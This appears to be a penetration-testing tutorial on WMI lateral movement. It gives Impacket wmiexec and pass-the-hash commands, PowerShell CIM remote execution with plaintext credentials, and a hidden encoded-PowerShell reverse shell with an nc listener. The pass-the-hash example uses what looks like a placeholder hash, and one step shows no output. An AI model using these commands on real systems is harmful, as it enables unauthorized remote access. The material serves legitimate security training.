
WMI execution (often referred to as **wmi-exec**) is a lateral movement technique that abuses Windows Management Instrumentation to run commands on remote systems using valid credentials.

Unlike SMB-based execution (e.g., psexec), WMI does not require file drops on disk. It interacts directly with the Windows Management infrastructure and executes commands via the `Win32_Process` class.

This makes it:

- Less noisy in some environments
    
- Useful when SMB is restricted
    
- Compatible with both local and domain admin credentials
    

WMI execution relies on:

- RPC over port 135
    
- Dynamic high ports for communication
    

---

## Remote Execution from Linux

### Using Impacket wmiexec.py

One of the most common ways to perform WMI execution from a Linux attacker machine is using Impacket.

```bash
impacket-wmiexec corp.com/user:'user123!'@192.168.50.73
```

If authentication is successful, you will obtain a semi-interactive shell:

This method:

- Does not create a service
    
- Executes commands via WMI
    
- Returns output through SMB
    

### Pass-the-Hash with wmiexec

If you only have an NTLM hash:

```bash
impacket-wmiexec corp.com/user@192.168.50.73 -hashes :aad3b435b51404eeaad3b435b51404ee
```

---

## PowerShell-Based WMI Execution 

### Minimal Workflow

On a Windows machine, WMI execution is typically done using PowerShell with CIM sessions.

```powershell
$username = 'corp\\user'
$password = 'user123!'
$sec = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $sec)

$opt = New-CimSessionOption -Protocol DCOM
$s = New-CimSession -ComputerName 192.168.50.73 -Credential $cred -SessionOption $opt

Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd.exe'}
```

This will execute `cmd.exe` on the remote system.

---

## Reverse Shell via WMI

Instead of spawning a simple process, a payload can be executed.

Example using a Base64 encoded PowerShell payload:

```powershell
$cmd = 'powershell -nop -w hidden -e <BASE64_PAYLOAD>'

Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$cmd}
```

Listener:

```bash
nc -lvnp 443
```
